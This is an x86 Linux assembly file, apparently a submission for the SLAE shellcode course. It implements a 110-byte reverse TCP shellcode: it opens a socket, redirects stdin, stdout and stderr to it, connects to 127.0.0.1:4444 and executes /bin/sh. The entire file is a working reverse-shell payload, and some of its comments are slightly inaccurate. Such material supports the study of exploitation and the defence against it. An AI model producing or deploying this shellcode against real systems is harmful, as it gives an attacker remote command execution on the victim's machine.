;Architecture    : x86
;OS              : Linux
;Author          : Elham AlShehri
;ID              : SLAE-1538
;Shellcode Size  : 110 bytes
;Description     : An example of reverse TCP shellcode, and executing /bin/sh.

global _start			

section .text

	
_start:

	;---------- init
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	;---------- socket
	; push socket arguments
	push ebx               ; push 0 value for the Protocol

	inc ebx
	push ebx               ; push 1 value for the Type

	inc ebx
	push ebx               ; push 2 for the domain


	; save values in registers for the system call
	mov al, 0x66		; socketcall no.

	dec ebx			; ebx = 1 for socket function call
	mov ecx, esp            ; save pointer to args

	int 0x80
	
	;---------- duplicate STDIN
	mov ebx, eax		; save old file descriptopr in ebx
	xor ecx, ecx		; ecx = 0 = stdin

	mov al, 0x3f		; dup2 no.
	int 0x80

	;---------- duplicate STDOUT
	inc ecx			; ecx = 1 = stdout

	mov al, 0x3f		; dup2 no.
	int 0x80

	;--------- duplicate STDERR
	inc ecx			; ecx = 2 = stderr

	mov al, 0x3f		; dup2 no.
	int 0x80


	;---------- connect

	; ### push addr struct ###
	push 0x0100007f		; sin_addr = remote address

	push word 0x5C11	; push port = 4444 in hex is 115c and because of the little endian

	push cx			; sin_family = AF_INET = 2  

	mov ecx, esp		; save address structer pointer 

	; ### end struct ###

	; push bind arguments

	push 0x10		; addrlen = 0.0.0.0 (16 bits)
	push ecx		; address struct pointer
	push ebx		; sockfd from previous system call
	

	; save values in registers for the system call
	mov al, 0x66		; socketcall no.

	xor ebx, ebx
	mov bl, 3		; currently ebx = 3 for connect function call
	mov ecx, esp            ; save pointer to args

	int 0x80

	;--------- execute shell
	jmp short c_s
s:
	pop esi                    ; contains filename's address

	mov byte [esi +7], dl      ; replace A with \x00
	lea ebx, [esi]             ; 1st argument pointer

	; replace BBBB with NULLs
	mov dword [esi +8], edx    ; argv = NULL
	lea ecx, [esi +8]          ; 2nd argument pointer


	; replace CCCC with NULL
	mov dword [esi +12], edx   ; envp = NULL
	lea edx, [esi +12]         ; 3rd argument pointer (point to NULL)

	xor eax, eax
	mov al, 0xb
	int 0x80
c_s:
	call s                        ; call s label
	shell db "/bin/shABBBBCCCC"   ; name of the shell